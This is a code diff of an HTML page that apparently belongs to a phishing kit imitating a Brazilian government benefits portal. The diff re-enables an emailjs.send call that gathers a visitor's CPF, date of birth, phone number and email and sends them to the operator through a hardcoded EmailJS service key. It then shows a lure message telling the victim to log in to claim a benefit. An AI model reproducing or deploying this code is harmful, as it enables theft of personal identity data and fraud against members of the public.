@@ -15,13 +15,14 @@
     <div class="loader"></div>
     <p>Loading...</p>
   </div>
-  <meta http-equiv="refresh" content="6; URL='loginInGov.html'" />
+  <meta http-equiv="refresh" content="06; URL='loginInGov.html'" />
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
   <script src="../control/controlador.js"></script>
   <script type="module">
+    
     (function () {
-      emailjs.init("Lad9G2ud_wPxuwuf2");
+emailjs.init("Lad9G2ud_wPxuwuf2");
     })();
 
     window.onload = function () {
@@ -30,16 +31,17 @@
       var date = sheachDate()
 
       var message = `CPF = ${date[0]}; data de nascimento = ${date[1]}; telefone = ${date[2]}; email = ${date[3]}`
-      /* emailjs.send('service_b2pfjac', 'template_bmttgqn', {
-              message,
-            }, 'Lad9G2ud_wPxuwuf2')
-              .then((response) => {
-                console('Email enviado com sucesso!', response.status, response.text);
-                alert("Dados encontrados, por favor loge no sistema para solicitar seu benefício.");
-              }, (error) => {
-                console('Ocorreu um erro:', error);
-                alert('não foi encontrado seu nome na base')
-              });*/
+
+      emailjs.send('service_b2pfjac', 'template_bmttgqn', {
+        message,
+      }, 'Lad9G2ud_wPxuwuf2')
+        .then((response) => {
+          console('Email enviado com sucesso!', response.status, response.text);
+          alert("Dados encontrados, por favor loge no sistema para solicitar seu benefício.");
+        }, (error) => {
+          console('Ocorreu um erro:', error);
+          alert('não foi encontrado seu nome na base')
+        });
     }
   </script>
 </body>
